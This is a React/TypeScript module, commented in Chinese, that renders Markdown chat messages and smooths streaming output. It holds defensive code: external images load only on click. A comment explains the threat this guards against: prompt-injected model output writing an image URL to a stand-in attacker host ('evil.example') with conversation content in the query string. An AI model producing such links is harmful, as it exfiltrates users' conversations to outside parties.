"use client";

/**
 * Markdown 正文渲染（消息、流式回答、用户气泡共用）。
 *
 * 单独成模块是为了让它成为**懒加载分块**：react-markdown + remark-gfm + rehype-highlight
 * 带着 lowlight/highlight.js 的常用语言集，实测占首屏 JS 的 472KB（全部首屏 JS 1272KB），
 * 而 Hero 页（还没开会话）根本用不到它。ChatWindow 用 next/dynamic 引用本模块，
 * 首屏不再下载这 472KB；AppShell 在空闲时预取，真正打开会话时通常已经就绪。
 *
 * 流式输出版（v6 平滑化）：
 * - 逐帧推进：把「已到达的完整文本」和「已显示的文本」分开，每 ~16ms 只把显示进度往前推一小步，
 *   服务端 token 再来得快、再成串到达，界面也是匀速长出来的，不再 100ms 一跳一跳。
 * - 分块记忆化：「已稳定的完整块」按 key 记忆化，每帧只重新解析很短的 tail；
 *   长回答不会随长度增长而越来越卡（旧的 100ms 全量重解析正是卡顿来源）。
 * - 代码围栏内的 tail 用纯文本渲染，等闭合后再交给 highlight.js 高亮一次，
 *   避免流式代码块每帧重新高亮。
 */
import { memo, useEffect, useMemo, useRef, useState } from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { IconCheckOutline14, IconCopyOutline16 } from "@/components/icons";
import { copyText } from "@/lib/clipboard";
import { useI18n } from "@/i18n";

type MarkdownTextNode = { value?: unknown; children?: MarkdownTextNode[] };

function markdownNodeText(node: MarkdownTextNode | undefined): string {
	if (!node) return "";
	if (typeof node.value === "string") return node.value;
	return node.children?.map(markdownNodeText).join("") ?? "";
}

function CopyButton({ text }: { text: string }) {
	const [copied, setCopied] = useState(false);
	const [copyFailed, setCopyFailed] = useState(false);
	const { t } = useI18n();
	return (
		<>
			<button
				type="button"
				className="icon-btn"
				title={copyFailed ? t.copyFailed : t.copy}
				aria-label={t.copy}
				onClick={() => {
					void copyText(text).then((ok) => {
						setCopied(ok);
						setCopyFailed(!ok);
						setTimeout(() => { setCopied(false); setCopyFailed(false); }, 1200);
					});
				}}
			>
				{copied ? <IconCheckOutline14 size={14} /> : <IconCopyOutline16 size={14} />}
			</button>
			{copyFailed && <span role="alert" style={{ fontSize: 11, color: "var(--dsw-danger)" }}>{t.copyFailed}</span>}
		</>
	);
}

/** 同源图片可以直接显示；外部地址不行（见 SafeImage）。data: 早被 react-markdown 的默认 URL 过滤掉了 */
function isInlineImage(src: string): boolean {
	if (typeof window === "undefined") return false;
	try {
		return new URL(src, window.location.href).origin === window.location.origin;
	} catch {
		return false;
	}
}

/**
 * 外部图片默认不加载，点了才加载。
 * 模型输出可能被提示词注入（读到的网页、文件里藏着指令），让它写一张
 * `![](https://evil.example/?d=<会话内容>)`，浏览器一渲染就把内容发出去了 —— 不需要用户点任何东西。
 */
function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: string }) {
	const [allowed, setAllowed] = useState(false);
	const { t } = useI18n();
	const source = typeof src === "string" ? src : "";
	if (!source) return null;
	if (allowed || isInlineImage(source)) return <img src={source} alt={alt ?? ""} title={title} />;
	let host = source;
	try {
		host = new URL(source).host || source;
	} catch {
		/* 保留原样 */
	}
	return (
		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowed(true)}>
			{t.externalImage}{alt ? `：${alt}` : ""}（{host}）
		</button>
	);
}

/**
 * 只有 Markdown 内容、没有 .md 外层容器的纯内容组件。
 * 流式分块时，多个块共用同一个 .md 容器（外边距规则因此照旧生效），
 * 每块各自记忆化：只要 text 没变就不会重新解析。
 */
const MarkdownContent = memo(function MarkdownContent({ text }: { text: string }) {
	return (
		<ReactMarkdown
			remarkPlugins={[remarkGfm]}
			rehypePlugins={[[rehypeHighlight, { detect: false, ignoreMissing: true }]]}
			components={{
				a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
				img: ({ src, alt, title }) => <SafeImage src={src} alt={alt} title={title} />,
				pre: ({ node, children, ...props }) => (
					<div className="md-code-block">
						<div className="md-code-copy"><CopyButton text={markdownNodeText(node)} /></div>
						<pre {...props}>{children}</pre>
					</div>
				),
			}}
		>
			{text}
		</ReactMarkdown>
	);
});

export const MarkdownBlock = memo(function MarkdownBlock({ text }: { text: string }) {
	return (
		<div className="md">
			<MarkdownContent text={text} />
		</div>
	);
});

// ---------- 流式平滑渲染 ----------

/** 每帧推进间隔（≈60fps）。用 setTimeout 而非 rAF：后台标签页 / 测试环境同样确定，且与既有节流语义一致 */
const STREAM_STEP_MS = 16;
/** 追赶系数：每帧推进「剩余积压 / 该值」，既平滑又不会让显示落后太远（稳定态延迟约 4 帧） */
const STREAM_CATCH_UP_DIVISOR = 4;
/** 每帧至少推进的字符数，保证收尾时也能走完 */
const STREAM_MIN_CHARS = 2;

/** 列表项（含有序列表）；用于避免在松散列表内部的空行处切块 */
const LIST_ITEM_RE = /^ {0,3}(?:[-*+]|\d+[.)])\s/;
const FENCE_RE = /^ {0,3}(`{3,}|~{3,})/;

/**
 * 把流式文本切成「已稳定的完整块」+「正在生成的尾巴」。
 * - 只在代码围栏之外的空行处切分：空行是天然的块边界，两侧各自都是完整可解析的 Markdown；
 * - 若空行前后都是列表项（松散列表），不切，保持有序列表序号连续；
 * - 返回 tailInFence 供调用方决定尾巴是否走高亮渲染。
 */
export function splitStreamingMarkdown(text: string): { blocks: string[]; tail: string; tailInFence: boolean } {
	const blocks: string[] = [];
	let inFence = false;
	let fenceChar = "";
	let segStart = 0;
	let prevNonEmpty = "";
	let pos = 0;
	while (pos <= text.length) {
		const nl = text.indexOf("\n", pos);
		const lineEnd = nl === -1 ? text.length : nl;
		const line = text.slice(pos, lineEnd);
		const fence = FENCE_RE.exec(line);
		if (fence) {
			const ch = fence[1][0];
			if (!inFence) {
				inFence = true;
				fenceChar = ch;
			} else if (ch === fenceChar) {
				inFence = false;
			}
		}
		if (!inFence && nl !== -1 && line.trim() === "") {
			const nextStart = nl + 1;
			const nextNl = text.indexOf("\n", nextStart);
			const nextLine = text.slice(nextStart, nextNl === -1 ? text.length : nextNl);
			const looseList = LIST_ITEM_RE.test(prevNonEmpty) && LIST_ITEM_RE.test(nextLine);
			if (!looseList && nextLine.trim() !== "") {
				const seg = text.slice(segStart, nextStart);
				if (seg.trim()) blocks.push(seg);
				segStart = nextStart;
			}
		}
		if (line.trim() !== "") prevNonEmpty = line;
		if (nl === -1) break;
		pos = nl + 1;
	}
	return { blocks, tail: text.slice(segStart), tailInFence: inFence };
}

export const StreamingMarkdownBlock = memo(function StreamingMarkdownBlock({ text }: { text: string }) {
	const [shown, setShown] = useState(text);
	const targetRef = useRef(text);
	const shownRef = useRef(text);
	const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

	useEffect(() => {
		targetRef.current = text;
		// 节流而不是防抖：计时器只在空闲时才设，期间到来的新文本只更新目标、不重置计时。
		// 若每次变化都清掉重来，文本一直在流（约 16ms 一次）时计时器永远到不了点，正文就冻住了。
		if (timerRef.current !== null) return;
		const advance = () => {
			timerRef.current = null;
			const target = targetRef.current;
			const revealed = shownRef.current;
			const backlog = target.length - revealed.length;
			if (backlog <= 0) {
				// 目标被整体替换（长度没变但内容变了）也要跟上
				if (revealed !== target) {
					shownRef.current = target;
					setShown(target);
				}
				return;
			}
			const step = Math.max(STREAM_MIN_CHARS, Math.ceil(backlog / STREAM_CATCH_UP_DIVISOR));
			const next = target.slice(0, revealed.length + step);
			shownRef.current = next;
			setShown(next);
			timerRef.current = setTimeout(advance, STREAM_STEP_MS);
		};
		timerRef.current = setTimeout(advance, STREAM_STEP_MS);
	}, [text]);

	useEffect(() => () => {
		if (timerRef.current !== null) clearTimeout(timerRef.current);
		timerRef.current = null;
	}, []);

	const { blocks, tail, tailInFence } = useMemo(() => splitStreamingMarkdown(shown), [shown]);
	return (
		<div className="md pw-stream">
			{blocks.map((block, i) => <MarkdownContent key={i} text={block} />)}
			{tail && (tailInFence
				// 围栏还没闭合：纯文本顶着，等闭合后作为稳定块交给 highlight.js 高亮一次
				? <pre className="pw-stream-code">{tail}</pre>
				: <MarkdownContent text={tail} />)}
		</div>
	);
});

export default MarkdownBlock;
